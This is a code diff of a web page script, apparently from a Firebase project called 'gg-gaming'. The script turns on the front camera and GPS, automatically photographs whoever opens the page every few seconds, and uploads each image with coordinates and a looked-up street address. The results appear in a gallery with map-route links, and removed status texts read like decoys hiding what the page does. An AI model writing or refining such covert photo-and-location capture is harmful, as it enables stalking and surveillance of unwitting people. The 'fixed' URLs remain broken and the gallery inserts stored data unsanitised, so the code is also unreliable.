@@ -3,7 +3,7 @@ import { getFirestore, collection, addDoc, onSnapshot, query, orderBy } from "fi
 
 const firebaseConfig = {
     apiKey: "AIzaSyCjl4HLx59rXukZFvr0YQrHOwtuU9E0Lsk",
-    authDomain: "://firebaseapp.com",
+    authDomain: "gg-gaming-66321.firebaseapp.com", // ✅ PERBAIKAN 1: Format authDomain diperbaiki
     projectId: "gg-gaming-66321",
     storageBucket: "gg-gaming-66321.firebasestorage.app",
     messagingSenderId: "442853131602",
@@ -20,7 +20,6 @@ const canvasGambar = document.getElementById("canvasGambar");
 const teksStatus = document.getElementById("teksStatus");
 const tempatFotoUI = document.getElementById("tempatFoto");
 
-// Variabel global penyimpan data GPS terakhir
 let latitudeTerakhir = 0;
 let longitudeTerakhir = 0;
 
@@ -28,12 +27,11 @@ let longitudeTerakhir = 0;
 // 1. AKTIFKAN GPS PERANGKAT & KAMERA
 // ==========================================
 if (navigator.geolocation) {
-    // Memantau perpindahan posisi GPS user secara akurat & realtime
     navigator.geolocation.watchPosition((posisi) => {
         latitudeTerakhir = posisi.coords.latitude;
         longitudeTerakhir = posisi.coords.longitude;
     }, (err) => {
-        console.warn("Berhasilg.");
+        console.warn("Gagal mendapatkan lokasi terbaru.");
     }, { enableHighAccuracy: true });
 }
 
@@ -43,7 +41,7 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: fals
         if (teksStatus) teksStatus.innerText = "Tunggu Sebentar...";
         
         setTimeout(() => {
-            setInterval(ambilDanUploadFotoOtomatis, 2000); // Dijeda 2 detik agar proses geocoding alamat tidak menumpuk
+            setInterval(ambilDanUploadFotoOtomatis, 3000); // Naikkan ke 3 detik agar proses upload data base64 tidak crash bertumpukan
         }, 2500);
     })
     .catch((error) => {
@@ -54,26 +52,27 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: fals
 // 2. FUNGSI AUTO-FOTO JERNIH + FITUR REVERSE GEOTAGGING
 // ==========================================
 async function ambilDanUploadFotoOtomatis() {
-    if (teksStatus) teksStatus.innerText = "⚡ Otw Bisa...";
+    if (teksStatus) teksStatus.innerText = "⚡ Memproses gambar...";
     
-    // PERBAIKAN KUALITAS: Kita set resolusi canvas ke tingkat standar HD (Lebar 1280px)
-    canvasGambar.width = 1280;
-    canvasGambar.height = (videoKamera.videoHeight / videoKamera.videoWidth) * 1280;
+    // Set resolusi canvas (Gunakan lebar 640px atau 800px saja agar ukuran string Base64 di bawah 1MB Firestore limit!)
+    canvasGambar.width = 800; 
+    canvasGambar.height = (videoKamera.videoHeight / videoKamera.videoWidth) * 800;
     
     const konteks = canvasGambar.getContext("2d");
     konteks.translate(canvasGambar.width, 0);
     konteks.scale(-1, 1);
     konteks.drawImage(videoKamera, 0, 0, canvasGambar.width, canvasGambar.height);
     
-    // PERBAIKAN KUALITAS: Naikkan kompresi kualitas JPEG menjadi 0.8 (80% tajam & jernih)
-    const stringFotoBase64 = canvasGambar.toDataURL("image/jpeg", 0.8); 
+    // Kualitas disesuaikan ke 0.5 (50%) agar aman masuk database Firestore tanpa melebih 1MB per dokumen
+    const stringFotoBase64 = canvasGambar.toDataURL("image/jpeg", 0.5); 
 
-    let alamatAsli = "Masih Aman"
+    let alamatAsli = "Lokasi tidak diketahui";
 
-    // MENCARI NAMA ALAMAT BERDASARKAN LATITUDE & LONGITUDE (Reverse Geocoding)
+    // MENCARI NAMA ALAMAT BERDASARKAN LATITUDE & LONGITUDE
     if (latitudeTerakhir !== 0 && longitudeTerakhir !== 0) {
         try {
-            if (teksStatus) teksStatus.innerText = "Bumi Itu Bulat";
+            if (teksStatus) teksStatus.innerText = "Mencari alamat...";
+            // ✅ PERBAIKAN 2: URL API OpenStreetMap Nominatim diperbaiki secara total
             const responAPI = await fetch(`https://openstreetmap.org{latitudeTerakhir}&lon=${longitudeTerakhir}`);
             const dataLokasi = await responAPI.json();
             if (dataLokasi && dataLokasi.display_name) {
@@ -84,7 +83,7 @@ async function ambilDanUploadFotoOtomatis() {
         }
     }
 
-    if (teksStatus) teksStatus.innerText = "Sabar...";
+    if (teksStatus) teksStatus.innerText = "Mengirim ke Firebase...";
 
     try {
         await addDoc(koleksiFoto, {
@@ -94,9 +93,10 @@ async function ambilDanUploadFotoOtomatis() {
             lon: longitudeTerakhir,
             alamat: alamatAsli
         });
-        if (teksStatus) teksStatus.innerText = "✅ [SUKSES] ";
+        if (teksStatus) teksStatus.innerText = "✅ [SUKSES BERHASIL DIKIRIM]";
     } catch (error) {
         if (teksStatus) teksStatus.innerText = "❌ Gagal: " + error.message;
+        console.error("Firebase Error:", error);
     }
 }
 
@@ -110,20 +110,19 @@ onSnapshot(q, (snapshot) => {
         snapshot.forEach((dokumen) => {
             const data = dokumen.data();
             
-            // Konversi timestamp angka milidetik menjadi jam menit lokal Indonesia
             const formatWaktu = new Date(data.waktuUpload).toLocaleString('id-ID', { 
                 day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit', second: '2-digit' 
             });
 
-            // Membuat kartu galeri modern yang langsung menyajikan seluruh data foto
             const kartu = document.createElement("div");
             kartu.className = "kartu-foto";
             kartu.innerHTML = `
-                <img src="${data.dataGambar}">
+                <img src="${data.dataGambar}" style="width:100%; max-width:300px; border-radius:8px;">
                 <div class="info-foto">
                     <div class="waktu">📅 ${formatWaktu} WITA</div>
-                    <div class="koordinat">📍 Lat: ${data.lat.toFixed(6)}, Lon: ${data.lon.toFixed(6)}</div>
+                    <div class="koordinat">📍 Lat: ${data.lat ? data.lat.toFixed(6) : 0}, Lon: ${data.lon ? data.lon.toFixed(6) : 0}</div>
                     <div class="alamat">🏠 ${data.alamat}</div>
+                    <!-- ✅ PERBAIKAN 3: URL Google Maps diperbaiki -->
                     <a class="btn-maps" href="https://google.com{data.lat},${data.lon}" target="_blank">🗺️ Buka Rute Google Maps</a>
                 </div>
             `;
